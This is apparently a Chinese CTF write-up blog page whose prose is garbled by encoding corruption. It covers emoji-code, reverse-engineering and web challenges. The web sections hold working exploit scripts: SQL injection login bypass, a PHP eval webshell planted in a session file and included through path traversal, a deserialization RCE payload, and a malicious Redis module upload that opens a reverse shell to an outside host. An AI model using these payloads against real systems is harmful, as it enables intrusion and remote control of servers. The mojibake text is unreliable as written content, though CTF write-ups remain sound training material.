ğŸ‘ğŸš‚ğŸ™‹â˜ğŸš…ğŸŒˆğŸŒ‹ğŸ“†ğŸ™ğŸ™‰ğŸ‘¨ğŸ²ğŸ“™ğŸ’âœ‹ğŸ©ğŸ”¤ ğŸ”¤ğŸ“ğŸƒğŸ“ğŸŒ‡ğŸğŸŒ¹â˜ğŸ»ğŸ§ğŸ˜ªğŸƒğŸ’³ğŸ’°ğŸğŸ‘‡ğŸŸğŸ™‡ğŸ˜±ğŸ“¡ğŸ‘ğŸ‘„ğŸ“ğŸ”ªâ˜ğŸ’¬â­ğŸ”¤ ğŸ”¤ğŸ’‰ğŸŒ™â˜€ğŸ“­ğŸ“¨ğŸ‘‹ğŸŒ†ğŸšğŸ’˜ğŸ’»ğŸ˜„ğŸ’©ğŸ”‹ğŸŸğŸ”ˆğŸ“¢ğŸ‘ğŸŒ–ğŸ“ŒğŸ²ğŸ’•ğŸ›â•ğŸ·ğŸ€ğŸ¸ğŸ”¤ ğŸ”¤ğŸ¤ğŸ‘«ğŸš ğŸ’¨ğŸ“–ğŸš¦ğŸ”‘ğŸ“¥ğŸ”ªğŸˆğŸš’ğŸ’ŒğŸŒ´ğŸ‘ªğŸ˜¦ğŸ™‡ğŸŒğŸ“˜ğŸ˜ğŸ˜ğŸ‘²ğŸ¸ğŸ™â˜ğŸ¨ğŸ˜¸ğŸ”¤  ğŸ† â¡ï¸ list</span><br><span class="line">  ğŸ’­ ğŸ˜€ ğŸ½list 2â—ï¸â—ï¸</span><br><span class="line">ğŸ‰</span><br></pre></td></tr></table></figure>
<p>ä¸¤ä¸ªğŸ”¤ğŸ”¤ä¸­é—´è·Ÿçš„æ˜¯å¸¸é‡ï¼Œæ‰€ä»¥è¿™ä¸­é—´çš„ä¸€å †emojiå°±æ˜¯å­—ç¬¦ä¸²ï¼Œç„¶ååé¢è®¿é—®äº†list[2]è¿™ä¸ªå…ƒç´ ï¼Œå¯ä»¥ä¸‹è½½emojicodeç„¶åç¼–è¯‘è·‘ä¸€éï¼Œä½†æ˜¯æ²¡æœ‰è¾“å‡ºï¼Œå› ä¸ºå¤šäº†ä¸€ä¸ªğŸ’­</p>
<p><a target="_blank" rel="noopener" href="https://www.emojicode.org/docs/reference/basics.html">https://www.emojicode.org/docs/reference/basics.html</a></p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv4c1th4pnj61n30u0q7v02.jpg" alt=""></p>
<p>å…¶å®å°±æ˜¯ä¸ªæ³¨é‡Šï¼Œå»æ‰å³å¯</p>
<p>æœ¬è´¨å°±æ˜¯è®¿é—®åˆ—è¡¨ä¸­çš„2å·å…ƒç´ ï¼Œæ‹¿å‡ºæ¥æ˜¯è¿™ä¸ªä¸œè¥¿ğŸ‘ğŸ‘£ğŸ‘˜ğŸ‘ğŸ‘²ğŸ‘°ğŸ§ğŸ‘¬ğŸ‘–ğŸ‘˜ğŸ‘©ğŸªğŸ‘–ğŸ‘œğŸ‘¤ğŸ§ğŸ‘¡ğŸ¨ğŸ‘–ğŸ‘¤ğŸ‘˜ğŸ‘ªğŸ‘«ğŸªğŸ‘©ğŸ‘´</p>
<p>emoji decodeè§£ä¸€ä¸‹è·å¾—flag ç½‘å€ï¼š<a target="_blank" rel="noopener" href="http://www.atoolbox.net/Tool.php?Id=937">http://www.atoolbox.net/Tool.php?Id=937</a></p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv4c3e2luej61d80u0wgn02.jpg" alt=""></p>
<p>å½“ç„¶ä¹Ÿå¯ä»¥å»æ‰æ³¨é‡Šï¼Œç„¶åç¼–è¯‘ä¸€ä¸‹ï¼Œç„¶åå†å»emojiè§£ç </p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv4c5do0z5j60le08sgn202.jpg" alt=""></p>
<p>flag{y0u_ar3_em0j1_mast3r}</p>
<h2 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h2><h3 id="dragon"><a href="#dragon" class="headerlink" title="dragon"></a>dragon</h3><p>flag{l3m0n_l0v3_bas364}</p>
<p>æœ€åŸºæœ¬çš„base64ä»£ç ï¼Œä¸è¿‡æ¢äº†ä¸ªè¡¨ï¼Œè§£ç å°±å¥½</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">table = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/&quot;</span></span><br><span class="line">old_table = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"></span><br><span class="line">flag1 = <span class="string">&quot;zMXHz3TSm20WBL9SmhyZx2jHCZm2nh0=&quot;</span></span><br><span class="line"></span><br><span class="line">flag = base64.b64decode(flag1.translate(<span class="built_in">str</span>.maketrans(table,old_table)))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv5f6t4phxj60ry0cwdhj02.jpg" alt=""></p>
<h3 id="equation"><a href="#equation" class="headerlink" title="equation"></a>equation</h3><p>2020ç¾ŠåŸæ¯åŸé¢˜ï¼Œåªä¸è¿‡å»æ‰äº†pycåç¼–è¯‘çš„è¿‡ç¨‹ï¼ŒåŸé¢˜é“¾æ¥ï¼š<a target="_blank" rel="noopener" href="https://la13x.github.io/2021/04/16/buuctf-reverse1/#1-%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-login">https://la13x.github.io/2021/04/16/buuctf-reverse1/#1-%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-login</a></p>
<p>flag{58964088b637e50d3a22b9510c1d1ef8}</p>
<h3 id="flattening"><a href="#flattening" class="headerlink" title="flattening"></a>flattening</h3><h4 id="å‡ºé¢˜äººè§†è§’-1"><a href="#å‡ºé¢˜äººè§†è§’-1" class="headerlink" title="å‡ºé¢˜äººè§†è§’"></a>å‡ºé¢˜äººè§†è§’</h4><p>WDNMD çœŸéš¾ç¼–è¯‘ï¼Œå‡ºè¿™ä¸ªé¢˜è®©ğŸ‘´ğŸ»çŸ¥é“äº†ç¼–è¯‘ä¸æ˜¯é äººå“</p>
<p><img src="/Users/lemon/Library/Application%20Support/typora-user-images/image-20211005213507923.png" alt=""></p>
<p>gccå’Œg++è¦åˆ‡åˆ°8.xç‰ˆæœ¬æ‰è¡Œï¼Œç„¶åè¦æ”¹ä¸ªå•¥æ–‡ä»¶æ¥ç€charæ”¹ä¸ºuint_8å¥½åƒæ˜¯ï¼Œä¸ç®¡äº†ï¼Œåæ­£ğŸ‘´ğŸ»ç¼–å¥½äº†ï¼Œæ€»ä¹‹å°±æ˜¯å¾ˆæ°´çš„ä¸€ä¸ªé¢˜ï¼ŒçŸ¥é“æ··æ·†æŠ€æœ¯äº†é‚£å°±æ˜¯ç™½ç»™é¢˜ï¼Œåæ­£ğŸ‘´ğŸ»æ˜¯ğŸ‘£æœ¬å°å­ï¼ŒğŸ‘´ğŸ»åªä¼šç”¨å·¥å…·å»æ··æ·†ï¼ŒğŸ‘´ğŸ»è¿˜æœ‰å¾ˆå¤šä¸œè¥¿è¦å­¦</p>
<h4 id="è§£é¢˜äººè§†è§’-1"><a href="#è§£é¢˜äººè§†è§’-1" class="headerlink" title="è§£é¢˜äººè§†è§’"></a>è§£é¢˜äººè§†è§’</h4><p>idaèµ°ä¸€æ³¢</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv4rpaar0aj314f0u0tap.jpg" alt=""></p>
<p>WDNMDï¼Œæ„è¯†åˆ°å¹¶ä¸ç®€å•ï¼Œçœ‹çœ‹CFG</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv4rpr6j8mj618d0u0go702.jpg" alt=""></p>
<p>è¡€å‹ä¸Šæ¥äº†ï¼Œä½†æ˜¯é—®é¢˜ä¸å¤§ï¼Œæ§åˆ¶æµå¹³å¦åŒ–ï¼Œå‚è§è¿™ä¸ªï¼š<a target="_blank" rel="noopener" href="https://la13x.github.io/2021/04/18/hardCpp/">https://la13x.github.io/2021/04/18/hardCpp/</a></p>
<p>ç”¨deflatä¸€æŠŠæ¢­ï¼Œå…ˆæ‰¾æ‰¾å…¥å£åœ°å€</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv4rox99y0j30cs05umxr.jpg" alt=""></p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv4rom2dzkj313c0asjug.jpg" alt=""></p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv4rsecpypj30k40qwjs6.jpg" alt=""></p>
<p>èˆ’æœäº†</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv4rsv20vlj315o0iwacm.jpg" alt=""></p>
<p>ä»€ä¹ˆç™½ç»™ç­¾åˆ°é¢˜ğŸ˜…</p>
<p>ç›´æ¥åœ¨dataæ®µæ‰¾åˆ°keyæ¯ä¸ªå€¼å¼‚æˆ–0x37å°±å‡ºäº†</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv4s3b74hkj614c0u0tan02.jpg" alt=""></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> key[] =</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="number">116</span>,</span><br><span class="line">    <span class="number">7</span>,</span><br><span class="line">    <span class="number">89</span>,</span><br><span class="line">    <span class="number">67</span>,</span><br><span class="line">    <span class="number">69</span>,</span><br><span class="line">    <span class="number">7</span>,</span><br><span class="line">    <span class="number">123</span>,</span><br><span class="line">    <span class="number">104</span>,</span><br><span class="line">    <span class="number">81</span>,</span><br><span class="line">    <span class="number">6</span>,</span><br><span class="line">    <span class="number">7</span>,</span><br><span class="line">    <span class="number">64</span>,</span><br><span class="line">    <span class="number">104</span>,</span><br><span class="line">    <span class="number">81</span>,</span><br><span class="line">    <span class="number">6</span>,</span><br><span class="line">    <span class="number">86</span>,</span><br><span class="line">    <span class="number">67</span>,</span><br><span class="line">    <span class="number">67</span>,</span><br><span class="line">    <span class="number">4</span>,</span><br><span class="line">    <span class="number">89</span>,</span><br><span class="line">    <span class="number">94</span>,</span><br><span class="line">    <span class="number">89</span>,</span><br><span class="line">    <span class="number">80</span>,</span><br><span class="line">    <span class="number">104</span>,</span><br><span class="line">    <span class="number">6</span>,</span><br><span class="line">    <span class="number">68</span>,</span><br><span class="line">    <span class="number">104</span>,</span><br><span class="line">    <span class="number">69</span>,</span><br><span class="line">    <span class="number">4</span>,</span><br><span class="line">    <span class="number">86</span>,</span><br><span class="line">    <span class="number">6</span>,</span><br><span class="line">    <span class="number">6</span>,</span><br><span class="line">    <span class="number">78</span>,</span><br><span class="line">    <span class="number">104</span>,</span><br><span class="line">    <span class="number">6</span>,</span><br><span class="line">    <span class="number">89</span>,</span><br><span class="line">    <span class="number">67</span>,</span><br><span class="line">    <span class="number">4</span>,</span><br><span class="line">    <span class="number">69</span>,</span><br><span class="line">    <span class="number">4</span>,</span><br><span class="line">    <span class="number">68</span>,</span><br><span class="line">    <span class="number">67</span>,</span><br><span class="line">    <span class="number">6</span>,</span><br><span class="line">    <span class="number">89</span>,</span><br><span class="line">    <span class="number">80</span>,</span><br><span class="line">    <span class="number">55</span></span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(key)/<span class="number">4</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">  	<span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, key[i]^<span class="number">0x37</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv4s5ucmtgj30ik05owf4.jpg" alt=""></p>
<p>flag{C0ntr0L_f10w_f1att3ning_1s_r3a11y_1nt3r3st1ng}</p>
<h1 id="wp-by-Sparta-EN"><a href="#wp-by-Sparta-EN" class="headerlink" title="wp by Sparta_EN"></a>wp by Sparta_EN</h1><h2 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h2><p>æ ¹æ®æè¿° ç›´æ¥åœ¨ CTFd é¡µé¢æŸ¥çœ‹æºç </p>
<p><img src="https://i.loli.net/2021/10/05/f9hUnSqNLdQjtcZ.png" alt="image.png"></p>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Simple-PHP"><a href="#Simple-PHP" class="headerlink" title="Simple PHP"></a>Simple PHP</h3><p><code>www.zip</code> è·å–æºç  <code>debug_only/infoinfoinfome.php</code> æŸ¥çœ‹PHPInfo</p>
<p>ç›´æ¥çœ‹æºç  SQL æ²¡åšè¿‡æ»¤ï¼Œä½¿ç”¨äº† <code>password_hash()</code>å¯¹å¯†ç å– hash</p>
<p>æ„é€  Payload  <code>username=&#39; UNION SELECT 1337, &#39;testuser&#39;, &#39;$2y$10$CkDlt51VAEIFDp5A8YVft.rzVRjuHhe9YzYI1Cug0nwJzmamvx1EK&#39;, &#39;&#39; -- &amp;password=passw0rd</code> è¿™é‡Œçš„ hash å³ <code>passw0rd</code>çš„ hash æ ¹æ®ç™»é™†é¡µé¢çš„ hint, id å– 1337 å¯ä»¥é€šè¿‡ç™»å…¥åçš„ check </p>
<p>ç™»å…¥åå‘ç°æˆ‘ä»¬å¯ä»¥æ›´æ–°ç”¨æˆ·æ•°æ®ï¼Œå‚è€ƒæºç  æˆ‘ä»¬å‘ç°è¿™ä¸ªåº”ç”¨ä¼šæŠŠç”¨æˆ·æ•°æ®åºåˆ—åŒ–åå†™å…¥ SESSION</p>
<p><img src="https://i.loli.net/2021/10/05/3r61PvY8tMGQIdo.png" alt="image.png"></p>
<p>è€Œä¸” <code>index.php</code>åšäº†ä¸€ç³»åˆ—çš„æ£€æŸ¥ï¼Œä½†æ˜¯æ²¡æœ‰è¿‡æ»¤ session æ–‡ä»¶ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æ›´æ–°ç”¨æˆ·ä»»æ„å­—æ®µ(å¯†ç é™¤å¤–)ä¸ºä¸€å¥è¯æœ¨é©¬</p>
<p>ç»“åˆ phpinfo(); çš„ç»“æœï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°ä¼šè¯è·¯å¾„ä¸º <code>/var/lib/php/sessions</code></p>
<p>å³å¯è¿›è¡Œä¼šè¯åŒ…å«ã€‚å‘ç° flag ä¸º <code>/flag-&lt;éšæœºå­—ç¬¦&gt;</code>ï¼Œ<code>cat</code>ä¸‹è¯»å‡ºå³å¯ã€‚</p>
<p><img src="https://i.loli.net/2021/10/06/sydojEwr7TC2bGc.png" alt="image.png"></p>
<p>é™„ EXP</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">sess = requests.session()</span><br><span class="line"><span class="comment"># password=test&amp;username=123%27%20UNION%20SELECT%201,%27test%27,%27$2a$12$QBE87yzDmO9BEq1JWZq1eODkoVzbk6mQ0nyU400CB90Vz8SSi9b2m%27,%27%27%20+--+</span></span><br><span class="line">target = <span class="string">&quot;http://152.136.99.28:30166/&quot;</span></span><br><span class="line">session_path = <span class="string">&quot;/var/lib/php/sessions/&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># passw0rd</span></span><br><span class="line"><span class="comment"># $2y$10$CkDlt51VAEIFDp5A8YVft.rzVRjuHhe9YzYI1Cug0nwJzmamvx1EK</span></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>: <span class="string">&quot;&#x27; UNION SELECT 1337, &#x27;testuser&#x27;, &#x27;$2y$10$CkDlt51VAEIFDp5A8YVft.rzVRjuHhe9YzYI1Cug0nwJzmamvx1EK&#x27;, &#x27;&#x27; -- &quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">&quot;passw0rd&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;[+] Trying to auth with sql injection&quot;</span>)</span><br><span class="line"></span><br><span class="line">r = sess.post(<span class="string">f&quot;<span class="subst">&#123;target&#125;</span>/login.php&quot;</span>, data=payload, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">session_id = r.cookies.get(<span class="string">&quot;PHPSESSID&quot;</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">f&#x27;[*] Session ID: <span class="subst">&#123;session_id&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> r.status_code != <span class="number">302</span>:</span><br><span class="line">    print(<span class="string">&quot;[!] Auth failure!&quot;</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;[+] Updating user info with malicious data&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>: <span class="string">&quot;user&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">&quot;passw0rd&quot;</span>,</span><br><span class="line">    <span class="comment"># Where the magic happens</span></span><br><span class="line">    <span class="string">&quot;description&quot;</span>: <span class="string">&quot;&lt;?php eval($_REQUEST[\&quot;cmd\&quot;]); ?&gt;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = sess.post(<span class="string">f&quot;<span class="subst">&#123;target&#125;</span>/index.php?page=me.php&quot;</span>, data=payload)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;[+] Refreshing session...&quot;</span>)</span><br><span class="line"></span><br><span class="line">sess.get(<span class="string">f&quot;<span class="subst">&#123;target&#125;</span>/index.php?page=me.php&quot;</span>)</span><br><span class="line"></span><br><span class="line">params = &#123;</span><br><span class="line">    <span class="string">&quot;cmd&quot;</span>: <span class="string">&quot;echo system(&#x27;cat /flag*&#x27;);&quot;</span>,</span><br><span class="line">    <span class="string">&quot;page&quot;</span>: <span class="string">f&quot;../../../../../../<span class="subst">&#123;session_path&#125;</span>/sess_<span class="subst">&#123;session_id&#125;</span>&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = sess.get(<span class="string">f&quot;<span class="subst">&#123;target&#125;</span>/index.php&quot;</span>, params=params)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;[+] Getting flag&quot;</span>)</span><br><span class="line"></span><br><span class="line">print(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="Expresssssss"><a href="#Expresssssss" class="headerlink" title="Expresssssss"></a>Expresssssss</h3><p>ä¸‹è½½é™„ä»¶ è™½ç„¶çœ‹æ ·å­æ˜¯ä½¿ç”¨äº†éå¯¹ç§°å¯†é’¥ä½“åˆ¶å®ç° JWTï¼Œä½†å¾ˆæ˜æ˜¾ï¼Œç®—æ³•é€‰é”™äº† </p>
<p><img src="https://i.loli.net/2021/10/06/Hlo7amCxiwuWSdJ.png" alt="image.png"></p>
<p>éå¯¹ç§°ä½“åˆ¶åº”å½“ä½¿ç”¨ <code>RS256</code>è€Œé<code>HS256</code>ï¼Œæ˜¯ä¸€ä¸ªå¾ˆä¸¥é‡çš„é”™è¯¯é…ç½®ï¼Œæˆ‘ä»¬ç»§ç»­å¾€åçœ‹</p>
<p><img src="https://i.loli.net/2021/10/06/h7gMXG5djwOSJae.png" alt="image.png"></p>
<p>serverConfig åœ¨ä¸Šæ–‡æ˜¯ç©ºçš„ï¼Œè€Œè¿™é‡Œéœ€è¦serverConfig.isOpen ä¸º <code>true</code>ï¼Œå†åŠ ä¸Šä¸Šé¢çš„æºç æœ‰å¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œ<code>merge</code>æ“ä½œã€‚</p>
<p><img src="https://i.loli.net/2021/10/06/YWhMjKirytQJfkO.png" alt="image.png"></p>
<p>çœ‹ä¸€ä¸‹æˆ‘ä»¬çš„ cookie å‘ç° PK ä»¥åŠå‘è¿‡æ¥äº†ã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™ä¸ª PK é€šè¿‡ <code>HS256</code>è‡ªå·±ç­¾å‘ JWT è¿›å…¥ <code>/admin</code></p>
<p>è¿™æ ·æˆ‘ä»¬ä¸å¦¨æ„é€ åŸå‹æ±¡æŸ“</p>
<p><img src="https://i.loli.net/2021/10/06/shDbwWGMNOR467L.png" alt="image.png"></p>
<p>æ›¿æ¢æ‰cookie</p>
<p><img src="https://i.loli.net/2021/10/06/CzuMFya3OnB9rmd.png" alt="image.png"></p>
<h3 id="Happy-PHP"><a href="#Happy-PHP" class="headerlink" title="Happy PHP"></a>Happy PHP</h3><p><img src="https://i.loli.net/2021/10/06/iucs6BIWmXj38ft.png" alt="image.png"></p>
<p>è¿™é‡Œéœ€è¦æ„é€ ååºåˆ—åŒ–</p>
<p>ä½†è¿™é‡Œå¯¹å¯¹åº”çš„å­—æ®µè¿›è¡Œäº†éªŒè¯ï¼Œæˆ‘ä»¬æ— æ³•é€šè¿‡æ”¹æ•°é‡ç»•è¿‡<code>__wakeup()</code>ï¼Œå¯ä»¥æ”¹å˜å¯¹è±¡çš„å¤§å°å†™æ¥ç»•è¿‡æ£€æµ‹ã€‚</p>
<p><code>x=O:1:&quot;B&quot;:1:&#123;s:1:&quot;a&quot;;O:1:&quot;a&quot;:2:&#123;s:4:&quot;code&quot;;s:24:&quot;eval($_REQUEST[&quot;code&quot;]);&quot;;&amp;code=echo%20123;</code></p>
<p>å¯ä»¥çœ‹åˆ°å›æ˜¾</p>
<p><img src="https://i.loli.net/2021/10/06/EpSvrKDTejP2aLw.png" alt="image.png"></p>
<p><img src="https://i.loli.net/2021/10/06/wZlgxsEUASqjuer.png" alt="image.png"></p>
<p><img src="https://i.loli.net/2021/10/06/U3LxMngYrjhEAVa.png" alt="image.png"></p>
<p><code>open_base_dir</code>å’Œ<code>disable_functions</code>éƒ½ç»™é™åˆ¶æ­»äº†</p>
<p>çœ‹ä¸€ä¸‹å½“å‰ç›®å½•å§</p>
<p><img src="https://i.loli.net/2021/10/06/u97pJGHFmR38lXa.png" alt="image.png"></p>
<p>æœ‰ä¸ª<code>.config.swp.php</code></p>
<p>æŠŠæ–‡ä»¶æ‹–ä¸‹æ¥ï¼Œvim æ¢å¤ä¸‹ å¾—åˆ° mysql ä¸ redis å‡­æ®ï¼Œè¯•äº†ä¸‹ redis è²Œä¼¼å¥½ä½¿ã€‚ä½†è²Œä¼¼æ²¡æ³•å†™æ–‡ä»¶ã€‚</p>
<p><img src="https://i.loli.net/2021/10/06/XifLGMKtxJFP3wy.png" alt="image.png"></p>
<p>æˆ‘ä»¬ä¸å¦¨çœ‹çœ‹è¿™ä¸ª redis æ˜¯å¦èƒ½å¤Ÿè½½å…¥æ¶æ„ moduleã€‚è¿™é‡Œä½¿ç”¨äº† <a target="_blank" rel="noopener" href="https://github.com/n0b0dyCN/RedisModules-ExecuteCommand">https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</a></p>
<p>å°†å…¶å†™å…¥ <code>/tmp</code>ç›®å½•ï¼Œç„¶åç™»å½•åˆ° redis è½½å…¥ åå¼¹ shell åˆ°æœåŠ¡å™¨</p>
<p>ç¼–å†™ EXP</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># base = O:1:&quot;B&quot;:1:&#123;s:1:&quot;a&quot;;O:1:&quot;A&quot;:1:&#123;s:4:&quot;code&quot;;s:24:&quot;eval($_REQUEST[&quot;code&quot;]);&quot;;&#125;&#125;</span></span><br><span class="line"></span><br><span class="line">target = <span class="string">&quot;http://152.136.99.28:30108&quot;</span></span><br><span class="line"></span><br><span class="line">redis_rce_mod = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">l_host = <span class="string">&quot;1.1.1.1&quot;</span></span><br><span class="line"></span><br><span class="line">l_port = <span class="string">&quot;1234&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rce</span>(<span class="params">code, additional=<span class="string">&quot;&quot;</span></span>):</span></span><br><span class="line">    payload = &#123;</span><br><span class="line">        <span class="string">&quot;x&quot;</span>: <span class="string">&#x27;O:1:&quot;B&quot;:1:&#123;s:1:&quot;a&quot;;O:1:&quot;a&quot;:2:&#123;s:4:&quot;code&quot;;s:24:&quot;eval($_REQUEST[&quot;code&quot;]);&quot;;&#125;&#125;&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;code&quot;</span>: code,</span><br><span class="line">        <span class="string">&quot;additional&quot;</span>: additional</span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(target, data=payload)</span><br><span class="line">    <span class="keyword">if</span> (r.status_code != <span class="number">200</span>):</span><br><span class="line">        <span class="keyword">raise</span> Exception(r.text)</span><br><span class="line">    <span class="keyword">return</span> r.text[<span class="number">132</span>:]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;module.so&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    redis_rce_mod = f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> rce(<span class="string">&quot;echo &#x27;Sparta_EN&#x27;;&quot;</span>) == <span class="string">&quot;Sparta_EN&quot;</span>:</span><br><span class="line">    print(<span class="string">&quot;[*] RCE confirmed!&quot;</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;[+] Uploading malicious redis module...&quot;</span>)</span><br><span class="line"></span><br><span class="line">rce(<span class="string">&quot;file_put_contents(&#x27;/tmp/module.so&#x27;, base64_decode($_REQUEST[&#x27;additional&#x27;]));&quot;</span>, base64.b64encode(</span><br><span class="line">    redis_rce_mod).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">rce(<span class="string">&quot;chmod(&#x27;/tmp/module.so&#x27;, 0777);&quot;</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;[+] Trying to trick redis load module and get a reverse shell...&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">revershell_payload = <span class="string">f&quot;&quot;&quot;set_time_limit(0);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$socket = socket_create(AF_INET, SOCK_STREAM, 0);</span></span><br><span class="line"><span class="string">socket_connect($socket, &quot;127.0.0.1&quot;, 6379);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$payload1 = &quot;*1\r\n$7\r\nCOMMAND\r\n&quot;;</span></span><br><span class="line"><span class="string">$payload2 = &quot;*2\r\n$4\r\nauth\r\n$26\r\nhehe_redis_goes_brrrrrrrrr\r\n&quot;;</span></span><br><span class="line"><span class="string">$payload3 = &quot;*3\r\n$6\r\nmodule\r\n$4\r\nload\r\n$14\r\n/tmp/module.so\r\n&quot;;</span></span><br><span class="line"><span class="string">$payload4 = &quot;*3\r\n$10\r\nsystem.rev\r\n$<span class="subst">&#123;<span class="built_in">len</span>(l_host)&#125;</span>\r\n<span class="subst">&#123;l_host&#125;</span>\r\n$<span class="subst">&#123;<span class="built_in">len</span>(l_port)&#125;</span>\r\n<span class="subst">&#123;l_port&#125;</span>\r\n&quot;;</span></span><br><span class="line"><span class="string">socket_write($socket, $payload1, strlen($payload1));</span></span><br><span class="line"><span class="string">$out = socket_read($socket, 2048);</span></span><br><span class="line"><span class="string">echo $out;</span></span><br><span class="line"><span class="string">socket_write($socket, $payload2, strlen($payload2));</span></span><br><span class="line"><span class="string">$out = socket_read($socket, 2048);</span></span><br><span class="line"><span class="string">echo $out;</span></span><br><span class="line"><span class="string">socket_write($socket, $payload3, strlen($payload3));</span></span><br><span class="line"><span class="string">$out = socket_read($socket, 2048);</span></span><br><span class="line"><span class="string">echo $out;</span></span><br><span class="line"><span class="string">socket_write($socket, $payload4, strlen($payload4));</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">print(rce(revershell_payload))</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;[+] Check your nc!&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/10/06/Kx6eHQkbVXG7Yy1.png" alt="image.png"></p>
<p><code>cat /flag</code>å‘ç°æ²¡æƒé™ï¼Œè€Œä¹‹å‰æœ‰ä¸ªè®°å½• payload çš„å‡½æ•°æœ‰æç¤ºæˆ‘ä»¬ä½¿ç”¨ readlog æŸ¥çœ‹è®°å½•ã€‚</p>
<p>çœ‹ä¸‹ binary</p>
<p><img src="https://i.loli.net/2021/10/06/PUHOfbaoTFte3M1.png" alt="image.png"></p>
<p>æ˜¯ä¸ª setuid</p>
<p>ä¸å¦¨æ‰§è¡Œä¸‹ å‘ç°å¯ä»¥ç›®å½•ç©¿è¶Šï¼Œè¯»å‡º flag</p>
